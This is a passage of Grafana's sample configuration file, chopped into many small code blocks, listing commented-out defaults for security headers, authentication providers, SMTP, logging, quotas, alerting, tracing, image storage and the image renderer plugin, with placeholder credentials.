# set to true if you want to allow browsers to render Grafana in a <frame>, <iframe>, <embed> or <object>. default is false.
;allow_embedding = false
```
```text
# Set to true if you want to enable http strict transport security (HSTS) response header.
```
```text
# This is only sent when HTTPS is enabled in this configuration.
```
```text
# HSTS tells browsers that the site should only be accessed using HTTPS.
;strict_transport_security = false
```
```text
# Sets how long a browser should cache HSTS. Only applied if strict_transport_security is enabled.
;strict_transport_security_max_age_seconds = 86400
```
```text
# Set to true if to enable HSTS preloading option. Only applied if strict_transport_security is enabled.
;strict_transport_security_preload = false
```
```text
# Set to true if to enable the HSTS includeSubDomains option. Only applied if strict_transport_security is enabled.
;strict_transport_security_subdomains = false
```
```text
# Set to true to enable the X-Content-Type-Options response header.
```
```text
# The X-Content-Type-Options response HTTP header is a marker used by the server to indicate that the MIME types advertised
```
```text
# in the Content-Type headers should not be changed and be followed.
;x_content_type_options = true
```
```text
# Set to true to enable the X-XSS-Protection header, which tells browsers to stop pages from loading
```
```text
# when they detect reflected cross-site scripting (XSS) attacks.
;x_xss_protection = true
```
```text
# Enable adding the Content-Security-Policy header to your requests.
```
```text
# CSP allows to control resources the user agent is allowed to load and helps prevent XSS attacks.
;content_security_policy = false
```
```text
# Set Content Security Policy template used when adding the Content-Security-Policy header to your requests.
```
```text
# $NONCE in the template includes a random nonce.
```
```text
# $ROOT_PATH is server.root_url without the protocol.
;content_security_policy_template = """script-src 'self' 'unsafe-eval' 'unsafe-inline' 'strict-dynamic' $NONCE;object-src 'none';font-src 'self';style-src 'self' 'unsafe-inline' blob:;img-src * data:;base-uri 'self';connect-src 'self' grafana.com ws://$ROOT_PATH wss://$ROOT_PATH;manifest-src 'self';media-src 'none';form-action 'self';"""

#################################### Snapshots ###########################
[snapshots]
```
```text
# snapshot sharing options
;external_enabled = true
;external_snapshot_url = https://snapshots-origin.raintank.io
;external_snapshot_name = Publish to snapshot.raintank.io
```
```text
# Set to true to enable this Grafana instance act as an external snapshot server and allow unauthenticated requests for
```
```text
# creating and deleting snapshots.
;public_mode = false
```
```text
# remove expired snapshot
;snapshot_remove_expired = true

#################################### Dashboards History ##################
[dashboards]
```
```text
# Number dashboard versions to keep (per dashboard). Default: 20, Minimum: 1
;versions_to_keep = 20
```
```text
# Minimum dashboard refresh interval. When set, this will restrict users to set the refresh interval of a dashboard lower than given interval. Per default this is 5 seconds.
```
```text
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;min_refresh_interval = 5s
```
```text
# Path to the default home dashboard. If this value is empty, then Grafana uses StaticRootPath + "dashboards/home.json"
;default_home_dashboard_path =

#################################### Users ###############################
[users]
```
```text
# disable user signup / registration
;allow_sign_up = true
```
```text
# Allow non admin users to create organizations
;allow_org_create = true
```
```text
# Set to true to automatically assign new users to the default organization (id 1)
;auto_assign_org = true
```
```text
# Set this value to automatically add new users to the provided organization (if auto_assign_org above is set to true)
;auto_assign_org_id = 1
```
```text
# Default role new users will be automatically assigned (if disabled above is set to true)
;auto_assign_org_role = Viewer
```
```text
# Require email validation before sign up completes
;verify_email_enabled = false
```
```text
# Background text for the user field on the login page
;login_hint = email or username
;password_hint = password
```
```text
# Default UI theme ("dark" or "light")
;default_theme = dark
```
```text
# Path to a custom home page. Users are only redirected to this if the default home dashboard is used. It should match a frontend route and contain a leading slash.
; home_page =
```
```text
# External user management, these options affect the organization users view
;external_manage_link_url =
;external_manage_link_name =
;external_manage_info =
```
```text
# Viewers can edit/inspect dashboard settings in the browser. But not save the dashboard.
;viewers_can_edit = false
```
```text
# Editors can administrate dashboard, folders and teams they create
;editors_can_admin = false
```
```text
# The duration in time a user invitation remains valid before expiring. This setting should be expressed as a duration. Examples: 6h (hours), 2d (days), 1w (week). Default is 24h (24 hours). The minimum supported duration is 15m (15 minutes).
;user_invite_max_lifetime_duration = 24h
```
```text
# Enter a comma-separated list of users login to hide them in the Grafana UI. These users are shown to Grafana admins and themselves.
; hidden_users =

[auth]
```
```text
# Login cookie name
;login_cookie_name = grafana_session
```
```text
# The maximum lifetime (duration) an authenticated user can be inactive before being required to login at next visit. Default is 7 days (7d). This setting should be expressed as a duration, e.g. 5m (minutes), 6h (hours), 10d (days), 2w (weeks), 1M (month). The lifetime resets at each successful token rotation.
;login_maximum_inactive_lifetime_duration =
```
```text
# The maximum lifetime (duration) an authenticated user can be logged in since login time before being required to login. Default is 30 days (30d). This setting should be expressed as a duration, e.g. 5m (minutes), 6h (hours), 10d (days), 2w (weeks), 1M (month).
;login_maximum_lifetime_duration =
```
```text
# How often should auth tokens be rotated for authenticated users when being active. The default is each 10 minutes.
;token_rotation_interval_minutes = 10
```
```text
# Set to true to disable (hide) the login form, useful if you use OAuth, defaults to false
;disable_login_form = false
```
```text
# Set to true to disable the sign out link in the side menu. Useful if you use auth.proxy or auth.jwt, defaults to false
;disable_signout_menu = false
```
```text
# URL to redirect the user to after sign out
;signout_redirect_url =
```
```text
# Set to true to attempt login with OAuth automatically, skipping the login screen.
```
```text
# This setting is ignored if multiple OAuth providers are configured.
;oauth_auto_login = false
```
```text
# OAuth state max age cookie duration in seconds. Defaults to 600 seconds.
;oauth_state_cookie_max_age = 600
```
```text
# limit of api_key seconds to live before expiration
;api_key_max_seconds_to_live = -1
```
```text
# Set to true to enable SigV4 authentication option for HTTP-based datasources.
;sigv4_auth_enabled = false

#################################### Anonymous Auth ######################
[auth.anonymous]
```
```text
# enable anonymous access
;enabled = false
```
```text
# specify organization name that should be used for unauthenticated users
;org_name = Main Org.
```
```text
# specify role for unauthenticated users
;org_role = Viewer
```
```text
# mask the Grafana version number for unauthenticated users
;hide_version = false

#################################### GitHub Auth ##########################
[auth.github]
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = user:email,read:org
;auth_url = https://github.com/login/oauth/authorize
;token_url = https://github.com/login/oauth/access_token
;api_url = https://api.github.com/user
;allowed_domains =
;team_ids =
;allowed_organizations =

#################################### GitLab Auth #########################
[auth.gitlab]
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = api
;auth_url = https://gitlab.com/oauth/authorize
;token_url = https://gitlab.com/oauth/token
;api_url = https://gitlab.com/api/v4
;allowed_domains =
;allowed_groups =

#################################### Google Auth ##########################
[auth.google]
;enabled = false
;allow_sign_up = true
;client_id = some_client_id
;client_secret = some_client_secret
;scopes = https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email
;auth_url = https://accounts.google.com/o/oauth2/auth
;token_url = https://accounts.google.com/o/oauth2/token
;api_url = https://www.googleapis.com/oauth2/v1/userinfo
;allowed_domains =
;hosted_domain =

#################################### Grafana.com Auth ####################
[auth.grafana_com]
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = user:email
;allowed_organizations =

#################################### Azure AD OAuth #######################
[auth.azuread]
;name = Azure AD
;enabled = false
;allow_sign_up = true
;client_id = some_client_id
;client_secret = some_client_secret
;scopes = openid email profile
;auth_url = https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/authorize
;token_url = https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token
;allowed_domains =
;allowed_groups =

#################################### Okta OAuth #######################
[auth.okta]
;name = Okta
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = openid profile email groups
;auth_url = https://<tenant-id>.okta.com/oauth2/v1/authorize
;token_url = https://<tenant-id>.okta.com/oauth2/v1/token
;api_url = https://<tenant-id>.okta.com/oauth2/v1/userinfo
;allowed_domains =
;allowed_groups =
;role_attribute_path =
;role_attribute_strict = false

#################################### Generic OAuth ##########################
[auth.generic_oauth]
;enabled = false
;name = OAuth
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = user:email,read:org
;empty_scopes = false
;email_attribute_name = email:primary
;email_attribute_path =
;login_attribute_path =
;name_attribute_path =
;id_token_attribute_name =
;auth_url = https://foo.bar/login/oauth/authorize
;token_url = https://foo.bar/login/oauth/access_token
;api_url = https://foo.bar/user
;teams_url =
;allowed_domains =
;team_ids =
;allowed_organizations =
;role_attribute_path =
;role_attribute_strict = false
;groups_attribute_path =
;team_ids_attribute_path =
;tls_skip_verify_insecure = false
;tls_client_cert =
;tls_client_key =
;tls_client_ca =
;use_pkce = false

#################################### Basic Auth ##########################
[auth.basic]
;enabled = true

#################################### Auth Proxy ##########################
[auth.proxy]
;enabled = false
;header_name = X-WEBAUTH-USER
;header_property = username
;auto_sign_up = true
;sync_ttl = 60
;whitelist = 192.168.1.1, 192.168.2.1
;headers = Email:X-User-Email, Name:X-User-Name
```
```text
# Read the auth proxy docs for details on what the setting below enables
;enable_login_token = false

#################################### Auth JWT ##########################
[auth.jwt]
;enabled = true
;header_name = X-JWT-Assertion
;email_claim = sub
;username_claim = sub
;jwk_set_url = https://foo.bar/.well-known/jwks.json
;jwk_set_file = /path/to/jwks.json
;cache_ttl = 60m
;expected_claims = {"aud": ["foo", "bar"]}
;key_file = /path/to/key/file

#################################### Auth LDAP ##########################
[auth.ldap]
;enabled = false
;config_file = /etc/grafana/ldap.toml
;allow_sign_up = true
```
```text
# LDAP background sync (Enterprise only)
```
```text
# At 1 am every day
;sync_cron = "0 0 1 * * *"
;active_sync_enabled = true

#################################### AWS ###########################
[aws]
```
```text
# Enter a comma-separated list of allowed AWS authentication providers.
```
```text
# Options are: default (AWS SDK Default), keys (Access && secret key), credentials (Credentials field), ec2_iam_role (EC2 IAM Role)
; allowed_auth_providers = default,keys,credentials
```
```text
# Allow AWS users to assume a role using temporary security credentials.
```
```text
# If true, assume role will be enabled for all AWS authentication providers that are specified in aws_auth_providers
; assume_role_enabled = true

#################################### Azure ###############################
[azure]
```
```text
# Azure cloud environment where Grafana is hosted
```
```text
# Possible values are AzureCloud, AzureChinaCloud, AzureUSGovernment and AzureGermanCloud
```
```text
# Default value is AzureCloud (i.e. public cloud)
;cloud = AzureCloud
```
```text
# Specifies whether Grafana hosted in Azure service with Managed Identity configured (e.g. Azure Virtual Machines instance)
```
```text
# If enabled, the managed identity can be used for authentication of Grafana in Azure services
```
```text
# Disabled by default, needs to be explicitly enabled
;managed_identity_enabled = false
```
```text
# Client ID to use for user-assigned managed identity
```
```text
# Should be set for user-assigned identity and should be empty for system-assigned identity
;managed_identity_client_id =

#################################### SMTP / Emailing ##########################
[smtp]
;enabled = false
;host = localhost:25
;user =
```
```text
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
;cert_file =
;key_file =
;skip_verify = false
;from_address = admin@grafana.localhost
;from_name = Grafana
```
```text
# EHLO identity in SMTP dialog (defaults to instance_name)
;ehlo_identity = dashboard.example.com
```
```text
# SMTP startTLS policy (defaults to 'OpportunisticStartTLS')
;startTLS_policy = NoStartTLS

[emails]
;welcome_email_on_sign_up = false
;templates_pattern = emails/*.html, emails/*.txt
;content_types = text/html

#################################### Logging ##########################
[log]
```
```text
# Either "console", "file", "syslog". Default is console and  file
```
```text
# Use space to separate multiple modes, e.g. "console file"
;mode = console file
```
```text
# Either "debug", "info", "warn", "error", "critical", default is "info"
;level = info
```
```text
# optional settings to set different levels for specific loggers. Ex filters = sqlstore:debug
;filters =
```
```text
# For "console" mode only
[log.console]
;level =
```
```text
# log line format, valid options are text, console and json
;format = console
```
```text
# For "file" mode only
[log.file]
;level =
```
```text
# log line format, valid options are text, console and json
;format = text
```
```text
# This enables automated log rotate(switch of following options), default is true
;log_rotate = true
```
```text
# Max line number of single file, default is 1000000
;max_lines = 1000000
```
```text
# Max size shift of single file, default is 28 means 1 << 28, 256MB
;max_size_shift = 28
```
```text
# Segment log daily, default is true
;daily_rotate = true
```
```text
# Expired days of log file(delete after max days), default is 7
;max_days = 7

[log.syslog]
;level =
```
```text
# log line format, valid options are text, console and json
;format = text
```
```text
# Syslog network type and address. This can be udp, tcp, or unix. If left blank, the default unix endpoints will be used.
;network =
;address =
```
```text
# Syslog facility. user, daemon and local0 through local7 are valid.
;facility =
```
```text
# Syslog tag. By default, the process' argv[0] is used.
;tag =

[log.frontend]
```
```text
# Should Sentry javascript agent be initialized
;enabled = false
```
```text
# Sentry DSN if you want to send events to Sentry.
;sentry_dsn =
```
```text
# Custom HTTP endpoint to send events captured by the Sentry agent to. Default will log the events to stdout.
;custom_endpoint = /log
```
```text
# Rate of events to be reported between 0 (none) and 1 (all), float
;sample_rate = 1.0
```
```text
# Requests per second limit enforced an extended period, for Grafana backend log ingestion endpoint (/log).
;log_endpoint_requests_per_second_limit = 3
```
```text
# Max requests accepted per short interval of time for Grafana backend log ingestion endpoint (/log).
;log_endpoint_burst_limit = 15

#################################### Usage Quotas ########################
[quota]
; enabled = false

#### set quotas to -1 to make unlimited. ####
```
```text
# limit number of users per Org.
; org_user = 10
```
```text
# limit number of dashboards per Org.
; org_dashboard = 100
```
```text
# limit number of data_sources per Org.
; org_data_source = 10
```
```text
# limit number of api_keys per Org.
; org_api_key = 10
```
```text
# limit number of alerts per Org.
;org_alert_rule = 100
```
```text
# limit number of orgs a user can create.
; user_org = 10
```
```text
# Global limit of users.
; global_user = -1
```
```text
# global limit of orgs.
; global_org = -1
```
```text
# global limit of dashboards
; global_dashboard = -1
```
```text
# global limit of api_keys
; global_api_key = -1
```
```text
# global limit on number of logged in users.
; global_session = -1
```
```text
# global limit of alerts
;global_alert_rule = -1

#################################### Unified Alerting ####################
[unified_alerting]
#Enable the Unified Alerting sub-system and interface. When enabled we'll migrate all of your alert rules and notification channels to the new system. New alert rules will be created and your notification channels will be converted into an Alertmanager configuration. Previous data is preserved to enable backwards compatibility but new data is removed.```
;enabled = true
```
```text
# Comma-separated list of organization IDs for which to disable unified alerting. Only supported if unified alerting is enabled.
;disabled_orgs =
```
```text
# Specify the frequency of polling for admin config changes.
```
```text
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;admin_config_poll_interval = 60s
```
```text
# Specify the frequency of polling for Alertmanager config changes.
```
```text
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;alertmanager_config_poll_interval = 60s
```
```text
# Listen address/hostname and port to receive unified alerting messages for other Grafana instances. The port is used for both TCP and UDP. It is assumed other Grafana instances are also running on the same port. The default value is `0.0.0.0:9094`.
;ha_listen_address = "0.0.0.0:9094"
```
```text
# Listen address/hostname and port to receive unified alerting messages for other Grafana instances. The port is used for both TCP and UDP. It is assumed other Grafana instances are also running on the same port. The default value is `0.0.0.0:9094`.
;ha_advertise_address = ""
```
```text
# Comma-separated list of initial instances (in a format of host:port) that will form the HA cluster. Configuring this setting will enable High Availability mode for alerting.
;ha_peers = ""
```
```text
# Time to wait for an instance to send a notification via the Alertmanager. In HA, each Grafana instance will
```
```text
# be assigned a position (e.g. 0, 1). We then multiply this position with the timeout to indicate how long should
```
```text
# each instance wait before sending the notification to take into account replication lag.
```
```text
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;ha_peer_timeout = "15s"
```
```text
# The interval between sending gossip messages. By lowering this value (more frequent) gossip messages are propagated
```
```text
# across cluster more quickly at the expense of increased bandwidth usage.
```
```text
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;ha_gossip_interval = "200ms"
```
```text
# The interval between gossip full state syncs. Setting this interval lower (more frequent) will increase convergence speeds
```
```text
# across larger clusters at the expense of increased bandwidth usage.
```
```text
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;ha_push_pull_interval = "60s"
```
```text
# Enable or disable alerting rule execution. The alerting UI remains visible. This option has a legacy version in the `[alerting]` section that takes precedence.
;execute_alerts = true
```
```text
# Alert evaluation timeout when fetching data from the datasource. This option has a legacy version in the `[alerting]` section that takes precedence.
```
```text
# The timeout string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;evaluation_timeout = 30s
```
```text
# Number of times we'll attempt to evaluate an alert rule before giving up on that evaluation. This option has a legacy version in the `[alerting]` section that takes precedence.
;max_attempts = 3
```
```text
# Minimum interval to enforce between rule evaluations. Rules will be adjusted if they are less than this value  or if they are not multiple of the scheduler interval (10s). Higher values can help with resource management as we'll schedule fewer evaluations over time. This option has a legacy version in the `[alerting]` section that takes precedence.
```
```text
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;min_interval = 10s

#################################### Alerting ############################
[alerting]
```
```text
# Disable legacy alerting engine & UI features
;enabled = false
```
```text
# Makes it possible to turn off alert execution but alerting UI is visible
;execute_alerts = true
```
```text
# Default setting for new alert rules. Defaults to categorize error and timeouts as alerting. (alerting, keep_state)
;error_or_timeout = alerting
```
```text
# Default setting for how Grafana handles nodata or null values in alerting. (alerting, no_data, keep_state, ok)
;nodata_or_nullvalues = no_data
```
```text
# Alert notifications can include images, but rendering many images at the same time can overload the server
```
```text
# This limit will protect the server from render overloading and make sure notifications are sent out quickly
;concurrent_render_limit = 5
```
```text
# Default setting for alert calculation timeout. Default value is 30
;evaluation_timeout_seconds = 30
```
```text
# Default setting for alert notification timeout. Default value is 30
;notification_timeout_seconds = 30
```
```text
# Default setting for max attempts to sending alert notifications. Default value is 3
;max_attempts = 3
```
```text
# Makes it possible to enforce a minimal interval between evaluations, to reduce load on the backend
;min_interval_seconds = 1
```
```text
# Configures for how long alert annotations are stored. Default is 0, which keeps them forever.
```
```text
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).
;max_annotation_age =
```
```text
# Configures max number of alert annotations that Grafana stores. Default value is 0, which keeps all alert annotations.
;max_annotations_to_keep =

#################################### Annotations #########################
[annotations]
```
```text
# Configures the batch size for the annotation clean-up job. This setting is used for dashboard, API, and alert annotations.
;cleanupjob_batchsize = 100

[annotations.dashboard]
```
```text
# Dashboard annotations means that annotations are associated with the dashboard they are created on.
```
```text
# Configures how long dashboard annotations are stored. Default is 0, which keeps them forever.
```
```text
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).
;max_age =
```
```text
# Configures max number of dashboard annotations that Grafana stores. Default value is 0, which keeps all dashboard annotations.
;max_annotations_to_keep =

[annotations.api]
```
```text
# API annotations means that the annotations have been created using the API without any
```
```text
# association with a dashboard.
```
```text
# Configures how long Grafana stores API annotations. Default is 0, which keeps them forever.
```
```text
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).
;max_age =
```
```text
# Configures max number of API annotations that Grafana keeps. Default value is 0, which keeps all API annotations.
;max_annotations_to_keep =

#################################### Explore #############################
[explore]
```
```text
# Enable the Explore section
;enabled = true

#################################### Internal Grafana Metrics ##########################
```
```text
# Metrics available at HTTP API Url /metrics
[metrics]
```
```text
# Disable / Enable internal metrics
;enabled           = true
```
```text
# Graphite Publish interval
;interval_seconds  = 10
```
```text
# Disable total stats (stat_totals_*) metrics to be generated
;disable_total_stats = false

#If both are set, basic auth will be required for the metrics endpoint.
; basic_auth_username =
; basic_auth_password =
```
```text
# Metrics environment info adds dimensions to the `grafana_environment_info` metric, which
```
```text
# can expose more information about the Grafana instance.
[metrics.environment_info]
#exampleLabel1 = exampleValue1
#exampleLabel2 = exampleValue2
```
```text
# Send internal metrics to Graphite
[metrics.graphite]
```
```text
# Enable by setting the address setting (ex localhost:2003)
;address =
;prefix = prod.grafana.%(instance_name)s.

#################################### Grafana.com integration  ##########################
```
```text
# Url used to import dashboards directly from Grafana.com
[grafana_com]
;url = https://grafana.com

#################################### Distributed tracing ############
[tracing.jaeger]
```
```text
# Enable by setting the address sending traces to jaeger (ex localhost:6831)
;address = localhost:6831
```
```text
# Tag that will always be included in when creating new spans. ex (tag1:value1,tag2:value2)
;always_included_tag = tag1:value1
```
```text
# Type specifies the type of the sampler: const, probabilistic, rateLimiting, or remote
;sampler_type = const
```
```text
# jaeger samplerconfig param
```
```text
# for "const" sampler, 0 or 1 for always false/true respectively
```
```text
# for "probabilistic" sampler, a probability between 0 and 1
```
```text
# for "rateLimiting" sampler, the number of spans per second
```
```text
# for "remote" sampler, param is the same as for "probabilistic"
```
```text
# and indicates the initial sampling rate before the actual one
```
```text
# is received from the mothership
;sampler_param = 1
```
```text
# sampling_server_url is the URL of a sampling manager providing a sampling strategy.
;sampling_server_url =
```
```text
# Whether or not to use Zipkin propagation (x-b3- HTTP headers).
;zipkin_propagation = false
```
```text
# Setting this to true disables shared RPC spans.
```
```text
# Not disabling is the most common setting when using Zipkin elsewhere in your infrastructure.
;disable_shared_zipkin_spans = false

#################################### External image storage ##########################
[external_image_storage]
```
```text
# Used for uploading images to public servers so they can be included in slack/email messages.
```
```text
# you can choose between (s3, webdav, gcs, azure_blob, local)
;provider =

[external_image_storage.s3]
;endpoint =
;path_style_access =
;bucket =
;region =
;path =
;access_key =
;secret_key =

[external_image_storage.webdav]
;url =
;public_url =
;username =
;password =

[external_image_storage.gcs]
;key_file =
;bucket =
;path =

[external_image_storage.azure_blob]
;account_name =
;account_key =
;container_name =

[external_image_storage.local]
```
```text
# does not require any configuration

[rendering]
```
```text
# Options to configure a remote HTTP image rendering service, e.g. using https://github.com/grafana/grafana-image-renderer.
```
```text
# URL to a remote HTTP image renderer service, e.g. http://localhost:8081/render, will enable Grafana to render panels and dashboards to PNG-images using HTTP requests to an external service.
;server_url =
```
```text
# If the remote HTTP image renderer service runs on a different server than the Grafana server you may have to configure this to a URL where Grafana is reachable, e.g. http://grafana.domain/.
;callback_url =
```
```text
# Concurrent render request limit affects when the /render HTTP endpoint is used. Rendering many images at the same time can overload the server,
```
```text
# which this setting can help protect against by only allowing a certain amount of concurrent requests.
;concurrent_render_request_limit = 30

[panels]
```
```text
# If set to true Grafana will allow script tags in text panels. Not recommended as it enable XSS vulnerabilities.
;disable_sanitize_html = false

[plugins]
;enable_alpha = false
;app_tls_skip_verify_insecure = false
```
```text
# Enter a comma-separated list of plugin identifiers to identify plugins to load even if they are unsigned. Plugins with modified signatures are never loaded.
;allow_loading_unsigned_plugins =
```
```text
# Enable or disable installing / uninstalling / updating plugins directly from within Grafana.
;plugin_admin_enabled = false
;plugin_admin_external_manage_enabled = false
;plugin_catalog_url = https://grafana.com/grafana/plugins/
```
```text
# Enter a comma-separated list of plugin identifiers to hide in the plugin catalog.
;plugin_catalog_hidden_plugins =

#################################### Grafana Live ##########################################
[live]
```
```text
# max_connections to Grafana Live WebSocket endpoint per Grafana server instance. See Grafana Live docs
```
```text
# if you are planning to make it higher than default 100 since this can require some OS and infrastructure
```
```text
# tuning. 0 disables Live, -1 means unlimited connections.
;max_connections = 100
```
```text
# allowed_origins is a comma-separated list of origins that can establish connection with Grafana Live.
```
```text
# If not set then origin will be matched over root_url. Supports wildcard symbol "*".
;allowed_origins =
```
```text
# engine defines an HA (high availability) engine to use for Grafana Live. By default no engine used - in
```
```text
# this case Live features work only on a single Grafana server. Available options: "redis".
```
```text
# Setting ha_engine is an EXPERIMENTAL feature.
;ha_engine =
```
```text
# ha_engine_address sets a connection address for Live HA engine. Depending on engine type address format can differ.
```
```text
# For now we only support Redis connection address in "host:port" format.
```
```text
# This option is EXPERIMENTAL.
;ha_engine_address = "127.0.0.1:6379"

#################################### Grafana Image Renderer Plugin ##########################
[plugin.grafana-image-renderer]
```
```text
# Instruct headless browser instance to use a default timezone when not provided by Grafana, e.g. when rendering panel image of alert.
```
```text
# See ICU’s metaZones.txt (https://cs.chromium.org/chromium/src/third_party/icu/source/data/misc/metaZones.txt) for a list of supported
```
```text
# timezone IDs. Fallbacks to TZ environment variable if not set.
;rendering_timezone =
```
```text
# Instruct headless browser instance to use a default language when not provided by Grafana, e.g. when rendering panel image of alert.
```
```text
# Please refer to the HTTP header Accept-Language to understand how to format this value, e.g. 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5'.
;rendering_language =
```
```text
# Instruct headless browser instance to use a default device scale factor when not provided by Grafana, e.g. when rendering panel image of alert.
```
```text
# Default is 1. Using a higher value will produce more detailed images (higher DPI), but will require more disk space to store an image.
;rendering_viewport_device_scale_factor =
```
```text
# Instruct headless browser instance whether to ignore HTTPS errors during navigation. Per default HTTPS errors are not ignored. Due to
```
```text
# the security risk it's not recommended to ignore HTTPS errors.
;rendering_ignore_https_errors =
```
```text
# Instruct headless browser instance whether to capture and log verbose information when rendering an image. Default is false and will
```
```text
# only capture and log error messages. When enabled, debug messages are captured and logged as well.
```
```text
# For the verbose information to be included in the Grafana server log you have to adjust the rendering log level to debug, configure
```
```text
# [log].filter = rendering:debug.
;rendering_verbose_logging =
```
```text
# Instruct headless browser instance whether to output its debug and error messages into running process of remote rendering service.
```
```text
# Default is false. This can be useful to enable (true) when troubleshooting.
;rendering_dumpio =
```
```text
# Additional arguments to pass to the headless browser instance. Default is --no-sandbox. The list of Chromium flags can be found
```
```text
# here (https://peter.sh/experiments/chromium-command-line-switches/). Multiple arguments is separated with comma-character.
;rendering_args =
```
```text
# You can configure the plugin to use a different browser binary instead of the pre-packaged version of Chromium.
```
```text
# Please note that this is not recommended, since you may encounter problems if the installed version of Chrome/Chromium is not
```
```text
# compatible with the plugin.
;rendering_chrome_bin =
```
```text
# Instruct how headless browser instances are created. Default is 'default' and will create a new browser instance on each request.
```
```text
# Mode 'clustered' will make sure that only a maximum of browsers/incognito pages can execute concurrently.
```
```text
# Mode 'reusable' will have one browser instance and will create a new incognito page on each request.
;rendering_mode =
```
```text
# When rendering_mode = clustered, you can instruct how many browsers or incognito pages can execute concurrently. Default is 'browser'
```
```text
# and will cluster using browser instances.
```
```text
# Mode 'context' will cluster using incognito pages.
;rendering_clustering_mode =
```
```text
# When rendering_mode = clustered, you can define the maximum number of browser instances/incognito pages that can execute concurrently. Default is '5'.
;rendering_clustering_max_concurrency =
```
```text
# When rendering_mode = clustered, you can specify the duration a rendering request can take before it will time out. Default is `30` seconds.
;rendering_clustering_timeout =
```
```text
# Limit the maximum viewport width, height and device scale factor that can be requested.
;rendering_viewport_max_width =
;rendering_viewport_max_height =
;rendering_viewport_max_device_scale_factor =
```
